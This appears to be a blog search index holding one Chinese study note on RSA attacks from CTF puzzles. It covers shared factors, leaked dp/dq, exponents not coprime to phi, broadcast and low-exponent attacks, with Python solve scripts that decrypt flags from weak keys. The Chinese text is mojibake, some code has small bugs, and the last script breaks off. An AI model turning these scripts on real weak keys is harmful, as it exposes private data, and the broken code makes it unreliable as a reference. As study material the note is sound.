<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ RSA</title>
      <link href="/2020/05/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRSA/"/>
      <url>/2020/05/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRSA/</url>
      
        <content type="html"><![CDATA[<p>RSAè‡ªä½¿ç”¨ä»¥æ¥ï¼Œå·²ç»å‡ºç°äº†ä¸€å †å †å„ç§ç±»å‹çš„attackï¼Œå‡†å¤‡ç”¨è¿™ç¯‡ç¬”è®°æ¥è®°å½•ä¸‹è¿™äº›ç±»å‹ã€‚è¾¹å­¦è¾¹æ›´å­â€¦</p><h1 id="è¯æ˜-m-equiv-c-d-pmod-n"><a href="#è¯æ˜-m-equiv-c-d-pmod-n" class="headerlink" title="è¯æ˜$m \equiv c^d \pmod n$"></a>è¯æ˜$m \equiv c^d \pmod n$</h1><p>æ¬§æ‹‰å®šç†ï¼šè‹¥$a,n$ä¸ºæ­£æ•´æ•°ï¼Œä¸”$ğ‘,ğ‘›$äº’ç´ ï¼ˆå³$gcd(a,n) = 1$ï¼‰ï¼Œåˆ™$ğ‘^{ğœ‘(ğ‘›)} \equiv 1 \pmod n$ã€‚<br>å·²çŸ¥ $1 \equiv e\cdot d \pmod {Ï†(n)}ï¼Œğ‘š &lt; ğ‘›ï¼Œc \equiv  m^e \pmod nï¼Œgcd(ğ‘š,ğ‘›) = 1$ï¼Œæ±‚è¯$m \equiv c^d \pmod n$ </p><p>ç­‰å¼å·¦è¾¹ä¸ºm</p><p>ç­‰å¼å³è¾¹ä¸º$c^d \pmod{n}$<br>âˆµ $ğ‘ \equiv m^e\pmod n $$</p><p>âˆ´ $c^d \pmod n \equiv  (m^e \pmod n)^d \pmod n \equiv  m^{e\cdot d} \pmod n $</p><p>âˆµ $1 \equiv  e\cdot d \pmod {Ï†(n)} $</p><p>âˆ´ $e\cdot d \equiv  k\cdot Ï†(n) + 1 $</p><p>âˆ´ $c^d  \equiv  m^{e \cdot d}  \equiv m^{k\cdot Ï†(n)+1}  \equiv  m\cdot (m^{Ï†(n)})^k \pmod n $</p><p>âˆµ $gcd(m,n) \equiv  1$</p><p> âˆ´ $m^{Ï†(n)} \equiv  1 \pmod n $</p><p>âˆ´ $c^d  \equiv  m\cdot (m^{Ï†(n)})^k \equiv  m\cdot (1)^k \equiv  m \pmod n $</p><p>âˆµ $m&lt;n$</p><p> âˆ´ $m \pmod n \equiv  m$</p><p> âˆ´ $c^d \equiv  m \pmod n \equiv  m $</p><p>ç­‰å¼å³è¾¹ç­‰äºç­‰å¼å·¦è¾¹ï¼Œè¯æ¯•ã€‚</p><hr><h1 id="på’Œqç›¸å·®è¿‡å¤§"><a href="#på’Œqç›¸å·®è¿‡å¤§" class="headerlink" title="på’Œqç›¸å·®è¿‡å¤§"></a>på’Œqç›¸å·®è¿‡å¤§</h1><p>å¦‚æœé¢˜ç›®ç»™åˆ°p = nextprime(q)</p><p>é‚£ä¹ˆpå’Œqç‰¹åˆ«æ¥è¿‘ï¼Œæ‰€ä»¥å¯ä»¥çœ‹ä½œ$n  = p^2$</p><p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å¯¹å¼€æ ¹å°±å¯ä»¥äº†</p><h1 id="æ¨¡næœ‰å…¬çº¦æ•°"><a href="#æ¨¡næœ‰å…¬çº¦æ•°" class="headerlink" title="æ¨¡næœ‰å…¬çº¦æ•°"></a>æ¨¡næœ‰å…¬çº¦æ•°</h1><p>æ¬§å‡ é‡Œå¾—è¾—è½¬ç›¸é™¤æ³•ï¼ˆgcdï¼‰å¾—å…¬çº¦æ•°</p><h1 id="å·²çŸ¥e-d-nåˆ†è§£æ¨¡æ±‚p-q"><a href="#å·²çŸ¥e-d-nåˆ†è§£æ¨¡æ±‚p-q" class="headerlink" title="å·²çŸ¥e,d,nåˆ†è§£æ¨¡æ±‚p,q"></a>å·²çŸ¥e,d,nåˆ†è§£æ¨¡æ±‚p,q</h1><p>åŸç†æ¥è‡ªè¿™ç¯‡<a href="https://paper.seebug.org/727/#11" target="_blank" rel="noopener">ç»¼è¿°</a></p><p>ç»™å®š$d$ï¼Œè®¡ç®—$k=d\cdot eâˆ’1$ã€‚æ ¹æ®$d$å’Œ$e$çš„å®šä¹‰æˆ‘ä»¬çŸ¥é“$k$æ˜¯$Ï†(N)$çš„å€æ•°ã€‚ç”±äº$Ï†(N)$æ˜¯å¶æ•°ï¼Œ$k=2^tr$å…¶ä¸­$r$ä¸ºå¥‡æ•°ä¸”$tâ‰¥1$ã€‚å¯¹äºæ¯ä¸ª$gâˆˆZâˆ—N$éƒ½æœ‰$g^k=1$ï¼Œå› æ­¤$g^{\frac{k}{2}}$æ˜¯å•ä½æ¨¡$N$çš„å¹³æ–¹æ ¹ã€‚æ ¹æ®ä¸­å›½å‰©ä½™å®šç†ï¼Œ1æœ‰å››ä¸ªå¹³æ–¹æ ¹æ¨¡$N=p\cdot q$ã€‚å…¶ä¸­ä¸¤ä¸ªå¹³æ–¹æ ¹æ˜¯$Â±1$ï¼Œå¦å¤–ä¸¤ä¸ªæ˜¯$Â±x$ï¼Œå…¶ä¸­xæ»¡è¶³$x\equiv 1 \pmod p$å’Œ$x\equiv âˆ’1 \pmod q$ã€‚ç”¨è¿™æœ€åä¸¤ä¸ªå¹³æ–¹æ ¹ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œé€šè¿‡è®¡ç®—$gcd(xâˆ’1,N)$æ¥æ­ç¤º$N$çš„å› å¼åˆ†è§£ã€‚ä¸€ä¸ªç›´æˆªäº†å½“çš„è®ºè¯è¡¨æ˜ï¼Œå¦‚æœä»$Z\cdot N$ä¸­éšæœºé€‰æ‹©$g$ï¼Œé‚£ä¹ˆåºåˆ—ä¸­çš„ä¸€ä¸ªå…ƒç´ $g^{\frac{k}{2}}ï¼Œg^{\frac{k}{4}},â€¦ï¼Œg^{\frac{k}{2^t}} \pmod N$æ˜¯ç»Ÿä¸€å¹³æ–¹æ ¹çš„æ¦‚ç‡è‡³å°‘ä¸º$\frac{1}{2}$ï¼Œä»è€Œæ­ç¤ºäº†$N$çš„åˆ†è§£ï¼Œåºåˆ—ä¸­çš„æ‰€æœ‰å…ƒç´ å¯ä»¥åœ¨æ—¶é—´$O(n^3))$å†…æœ‰æ•ˆåœ°è®¡ç®—ï¼Œå…¶ä¸­$n=log_2N$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_n_with_ed</span><span class="params">(n,e,d)</span>:</span>  </span><br><span class="line">    p = <span class="number">1</span>  </span><br><span class="line">    q = <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:  </span><br><span class="line">        k = d * e - <span class="number">1</span>  </span><br><span class="line">        g = random.randint ( <span class="number">0</span> , n )  </span><br><span class="line">        <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:  </span><br><span class="line">            k /= <span class="number">2</span>  </span><br><span class="line">            y = pow(g,k,n)  </span><br><span class="line">            <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:  </span><br><span class="line">                p = gcd(y<span class="number">-1</span>,n)  </span><br><span class="line">                q = n/p  </span><br><span class="line">    <span class="keyword">return</span> p,q</span><br></pre></td></tr></table></figure><h1 id="d-pã€d-q-æ³„éœ²"><a href="#d-pã€d-q-æ³„éœ²" class="headerlink" title="$d_pã€d_q$æ³„éœ²"></a>$d_pã€d_q$æ³„éœ²</h1><p>æ‘˜è‡ªè¿™ç¯‡<a href="https://code.felinae98.cn/ctf/crypto/rsa%E7%A7%81%E9%92%A5%E9%87%8D%E6%9E%84/" target="_blank" rel="noopener">ç§é’¥é‡æ„</a></p><p>é¦–å…ˆè¯´æ˜$d_p$å’Œ$d_q$çš„å«ä¹‰</p><p>$d_p \equiv d \pmod{Ï†(p)}$<br>$d_q \equiv d \pmod{Ï†(q)}$</p><p>åˆ©ç”¨æ¡ä»¶ï¼šå·²çŸ¥$pï¼Œqï¼Œd_pï¼Œd_qï¼Œc$ï¼Œæ— å…¬é’¥$e$ã€ç§é’¥$d$</p><p>è¯ï¼š</p><p>ç”±    $e\cdot d  \equiv 1 \pmod {(p-1)\cdot (q-1)}$</p><p>â€‹        $d_p \equiv d \pmod{Ï†(p)}$</p><p>å¾—    $e\cdot d_p \equiv  1 \pmod {Ï†(p)} $</p><p>è®¾$m_1  \equiv  m^{e\cdot d_p}  \equiv  c^{d_p} \pmod p$</p><p>åˆ™$m_1 \equiv  m^{k\cdot Ï†(p)+1} \pmod p $</p><p>ç”±è´¹é©¬å°å®šç†ï¼Œ$m^{Ï†(p)}  \equiv 1 \pmod p$</p><p>æ‰€ä»¥$ m_1  \equiv  m \pmod p$</p><p>åŒç† $m_2  \equiv  m  \equiv c^{d_q} \pmod q$</p><p>ç„¶åæˆ‘ä»¬å°±æœ‰åŒä½™å¼æ–¹ç¨‹ç»„ï¼š$m  \equiv  m_1  \pmod p$</p><p>â€‹                                                   $m  \equiv  m_2  \pmod q$</p><p>ç„¶åèµ°ä¸€æ³¢CRTæ¢å¤$m$å°±å¥½äº†ï¼ˆ$m &lt; p\cdot q$ï¼‰</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mp = pow(c,dp,p)</span><br><span class="line">mq = pow(c,dq,q)</span><br><span class="line">a = invert(p,q)</span><br><span class="line">b = invert(q,p)</span><br><span class="line">m = (mp*p*a+mq*q*b) % (p*q)</span><br></pre></td></tr></table></figure><h1 id="d-p-æ³„éœ²"><a href="#d-p-æ³„éœ²" class="headerlink" title="$d_p$æ³„éœ²"></a>$d_p$æ³„éœ²</h1><p>å·²çŸ¥ï¼šå…¬é’¥($n,e)$ä»¥åŠ$d_p$</p><p>æ±‚è§£ï¼š$d$</p><p>å·²çŸ¥æ¡ä»¶ï¼š</p><p>$c\equiv m^e \pmod n$<br>$m\equiv c^d \pmod n$<br>$Ï†(n)=(pâˆ’1)\cdot (qâˆ’1)$<br>$d\cdot e\equiv 1 \pmod {Ï†(n)}$</p><p>$d_p\equiv d \pmod {pâˆ’1}$</p><p> ç”±ä¸Šå¼å¯ä»¥å¾—åˆ°       $d_p\cdot e\equiv d\cdot e  \pmod {pâˆ’1}$</p><p>å³                                $d\cdot e = k_1\cdot (pâˆ’1)+d_p\cdot e$        â‘ </p><p>åˆ                                $d\cdot e\equiv 1 \pmod {(pâˆ’1)\cdot (qâˆ’1)}$            â‘¡</p><p>â‘ å¸¦å…¥â‘¡å¾—åˆ°ï¼š        $k_1\cdot (pâˆ’1)+d_p\cdot e \equiv  1\pmod { (pâˆ’1)\cdot (qâˆ’1)}$</p><p>å³                          $k_2\cdot (pâˆ’1)\cdot (qâˆ’1)+1=k_1\cdot (pâˆ’1)+d_p\cdot e$</p><p>æ•´ç†ä¸€ä¸‹    $(pâˆ’1)\cdot [k_2\cdot (qâˆ’1)âˆ’k_1]+1=d_p\cdot e$</p><p>å› ä¸º                                              $ d_p&lt;p-1$</p><p>æ‰€ä»¥                                        $e&gt;k_2\cdot (qâˆ’1)âˆ’k_1$</p><p>æˆ‘ä»¬å‡è®¾    $x = k_2\cdot (qâˆ’1)âˆ’k_1$</p><p>å³$    x$çš„èŒƒå›´ä¸º$(0,e)$</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥éå†$e$ç§å¯èƒ½å°±å¯ä»¥æ±‚å‡º$p-1 = \frac{d_p\cdot e -1} {x}$ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_nedp</span><span class="params">(n,e,dp)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,e):</span><br><span class="line">        <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">                p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">                q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="eä¸Ï†-n-ä¸äº’ç´ "><a href="#eä¸Ï†-n-ä¸äº’ç´ " class="headerlink" title="eä¸Ï†(n)ä¸äº’ç´ "></a>eä¸Ï†(n)ä¸äº’ç´ </h2><p>åœºæ™¯ï¼šé¢˜ç›®ç»™å‡ºä¸¤ç»„å…¬é’¥n1,n2,e1,e2ä»¥åŠç¬¬ä¸€ç»„ã€ç¬¬äºŒç»„åŠ å¯†åçš„å¯†æ–‡c1,c2</p><p>(å…¶å®æœ¬è´¨å°±æ˜¯ç»™å‡ºe,q,pæ±‚d)</p><p>å…ˆç”©ä¸€ä¸ªè„šæœ¬</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gcd(a, b):</span><br><span class="line">    if a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    while b != 0:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line">n1=0xbf510b8e2b169fbce366eb15a4f6c71b370f02f2108c7feb482234a386185bce1a740fa6498e04edbdf2a639e320619d9f39d3e740ebaf578af0426bc3e851001a1d599108a08725347f6680a7f5581a32d91505023701872c3df723e8de9f201d3b17059bebff944b915045870d757eb6d6d009eb4561cc7e4b89968e4433a9</span><br><span class="line">n2=0xba85d38d1bfc3fb281927c9246b5b771ac3344ca9fe1c2d9c793a886bffb5c84558f4a578cd5ba9e777a4e08f66d0cabe05b9aa2ae8d075778b5fbfff318a7f9b6f22e2eff6f79d8c1148941b3974f3e83a4a4f1520ad42336eddc572ec7ea04766eb798b2f1b1b52009b3eeea7741b2c55e3c7c11c5cf6a4e204c6b0d312f49</span><br><span class="line"></span><br><span class="line">p=gcd(n1,n2)</span><br><span class="line">q1=n1//p</span><br><span class="line">q2=n2//p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1=0x43e5cc4c99c3040aef2ccb0d4c45266f6b75cd7f9f1be105766689283f0886061c9cd52ac2b2b6c1b7d250c2079f354ca9b988db5556336201f3b5e489916b3b60b80c34bef8f608d7471fafaf14bee421b60630f42c5cc813356e786ff10e5efa334b8a73b7ea06afa6043f33be6a31010d306ba60516243add65c183da843a</span><br><span class="line">c2=0x79ec6350649377f69b475eca83a7d9d5356a1d62e29933e9c8e2b19b4b23626a581037aba3be6d7f73d5bed049350e41c1ed4cdc3e10ee34ec576ef3449be2f7d930c759612e1c23c4db71d0e5185a80b548031e3857dd93eca4af017fcd25895fcc4e8a2b36c1dd36b8cd9cc9200e2879f025928fe346e2cfae5200e66de6cc</span><br><span class="line">e1 =0x15d6439c6</span><br><span class="line">e2 =0x2c09848c6</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(gcd(e1,(p-1)*(q1-1)))</span></span><br><span class="line"><span class="comment">#print(gcd(e2,(p-1)*(q2-1)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1=e1//gcd(e1,(p-1)*(q1-1))</span><br><span class="line">e2=e2//gcd(e2,(p-1)*(q2-1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi1=(p-1)*(q1-1);phi2=(p-1)*(q2-1)</span><br><span class="line">d1=gmpy2.invert(e1,phi1)</span><br><span class="line">d2=gmpy2.invert(e2,phi2)</span><br><span class="line">f1=pow(c1,d1,n1)</span><br><span class="line">f2=pow(c2,d2,n2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def GCRT(mi, ai):</span><br><span class="line">    curm, cura = mi[0], ai[0]</span><br><span class="line">    for (m, a) in zip(mi[1:], ai[1:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    return (cura % curm, curm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f3,lcm = GCRT([n1,n2],[f1,f2])</span><br><span class="line">assert(f3%n1==f1)</span><br><span class="line">assert(f3%n2==f2)</span><br><span class="line">assert(lcm==q1*q2*p)</span><br><span class="line">n3=q1*q2</span><br><span class="line">c3=f3%n3</span><br><span class="line">phi3=(q1-1)*(q2-1)</span><br><span class="line"></span><br><span class="line">d3=gmpy2.invert(39929,phi3)<span class="comment">#39929æ˜¯79858//gcd((q1-1)*(q2-1),79858) å› ä¸ºæ–°çš„eå’ŒÏ†(n)è¿˜æ˜¯æœ‰å…¬å› æ•°2</span></span><br><span class="line">m3=pow(c3,d3,n3)</span><br><span class="line"></span><br><span class="line">if gmpy2.iroot(m3,2)[1] == 1:</span><br><span class="line">    flag=gmpy2.iroot(m3,2)[0]</span><br><span class="line"><span class="section">print(binascii.unhexlify(hex(flag)[2:].strip("L")))</span></span><br></pre></td></tr></table></figure><h1 id="å…¬é’¥nç”±å¤šä¸ªç´ æ•°å› å­ç»„æˆ"><a href="#å…¬é’¥nç”±å¤šä¸ªç´ æ•°å› å­ç»„æˆ" class="headerlink" title="å…¬é’¥nç”±å¤šä¸ªç´ æ•°å› å­ç»„æˆ"></a>å…¬é’¥nç”±å¤šä¸ªç´ æ•°å› å­ç»„æˆ</h1><p>emmmï¼Œå› å­è¶Šå¤šï¼Œnåè€Œä¼šè¶Šå®¹æ˜“åˆ†è§£ã€‚</p><p>ä¸æ­£å¸¸è§£å¯†RSAæ— å¼‚ã€‚æ ¹æ®å®šä¹‰æ±‚$Ï†(n)$å°±å¥½ã€‚</p><h1 id="ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»"><a href="#ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»" class="headerlink" title="ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»"></a>ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»</h1><p>æ»¡è¶³æ¡ä»¶ï¼šm.bit_length*e &lt; âˆc.bit_length    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n =  []</span><br><span class="line">c =  []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line">e=<span class="number">0x7</span></span><br><span class="line">m=iroot(CRT(n, c), e)[<span class="number">0</span>]</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="ä½è§£å¯†æŒ‡æ•°æ”»å‡»"><a href="#ä½è§£å¯†æŒ‡æ•°æ”»å‡»" class="headerlink" title="ä½è§£å¯†æŒ‡æ•°æ”»å‡»"></a>ä½è§£å¯†æŒ‡æ•°æ”»å‡»</h2><p>ä¸»è¦åˆ©ç”¨çš„æ˜¯ç§é’¥då¾ˆå°ï¼Œè¡¨ç°å½¢å¼ä¸€èˆ¬æ˜¯eå¾ˆå¤§</p><p>åˆ©ç”¨æ¡ä»¶ï¼šç»™å‡ºnå’Œeï¼Œeæ¥è¿‘n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_contfrac</span> <span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">''' </span></span><br><span class="line"><span class="string">    Converts a rational x/y fraction into</span></span><br><span class="line"><span class="string">    a list of partial quotients [a0, ..., an] </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    a = x//y</span><br><span class="line">    <span class="keyword">if</span> a * y == x:</span><br><span class="line">        <span class="keyword">return</span> [a]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pquotients = rational_to_contfrac(y, x - a * y)</span><br><span class="line">        pquotients.insert(<span class="number">0</span>, a)</span><br><span class="line">        <span class="keyword">return</span> pquotients</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_contfrac</span><span class="params">(frac)</span>:</span>    </span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    computes the list of convergents</span></span><br><span class="line"><span class="string">    using the list of partial quotients </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contfrac_to_rational</span> <span class="params">(frac)</span>:</span></span><br><span class="line">    <span class="string">'''Converts a finite continued fraction [a0, ..., an]</span></span><br><span class="line"><span class="string">     to an x/y rational.</span></span><br><span class="line"><span class="string">     '''</span></span><br><span class="line">    <span class="keyword">if</span> len(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> len(frac) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (frac[<span class="number">0</span>], <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        remainder = frac[<span class="number">1</span>:len(frac)]</span><br><span class="line">        (num, denom) = contfrac_to_rational(remainder)</span><br><span class="line">        <span class="comment"># fraction is now frac[0] + 1/(num/denom), which is </span></span><br><span class="line">        <span class="comment"># frac[0] + denom/num.</span></span><br><span class="line">        <span class="keyword">return</span> (frac[<span class="number">0</span>] * num + denom, num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Extended Euclidean Algorithm</span></span><br><span class="line"><span class="string">    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    u, u1 = <span class="number">1</span>, <span 